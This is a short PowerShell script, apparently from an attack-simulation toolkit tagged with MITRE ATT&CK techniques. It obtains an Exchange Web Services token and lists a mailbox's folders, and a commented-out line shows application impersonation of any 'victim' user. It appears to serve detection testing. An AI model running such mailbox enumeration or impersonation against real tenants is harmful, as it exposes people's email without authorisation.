<#
.SYNOPSIS
Connect to EWS and list all mailbox folders

.DESCRIPTION
TA0002: Execution
T1059.009: Cloud API
2nd attack method
#>

Get-Module | Where-Object name -eq connect-ews | Remove-Module
Import-Module ../APIs/connect-EWS.psm1
Get-Module | Where-Object name -eq readenv | Remove-Module
Import-Module ../APIs/readEnv.psm1
Get-Module | Where-Object name -eq custom | Remove-Module
Import-Module ../APIs/custom.psm1

# We use the ews environment variables
Import-Environment "ews.env"

Get-Module | Where-Object name -eq oauth-microsoft | Remove-Module
Import-Module ../APIs/oauth-microsoft.psm1
$scope = "https://outlook.office365.com/EWS.AccessAsUser.All"
$accessToken = Get-DelegatedAccessToken -tenantId $env:TENANT_ID -clientId $env:EWS_DELEGATE_CLIENT_ID -scope $scope -redirectUrl $env:EWS_DELEGATE_REDIRECT_URI

$exchService = Connect-EWSService -accessToken $accessToken

# Alternatively, we can also run this with a client grant instead of delegated credentials
# That allows us to impersonate any user
# $exchService = Connect-EWSService -impersonate -clientId $env:EWS_IMPERSONATE_CLIENT_ID -clientSecret $env:EWS_IMPERSONATE_CLIENT_SECRET -tenantId $env:TENANT_ID -upn $env:VICTIM_UPN

$folderView = New-Object Microsoft.Exchange.WebServices.Data.FolderView(100)
$folders = $exchService.FindFolders([Microsoft.Exchange.WebServices.Data.WellKnownFolderName]::MsgFolderRoot,$folderView)
$folders | Select-Object DisplayName, FolderClass, UnreadCount | Format-Table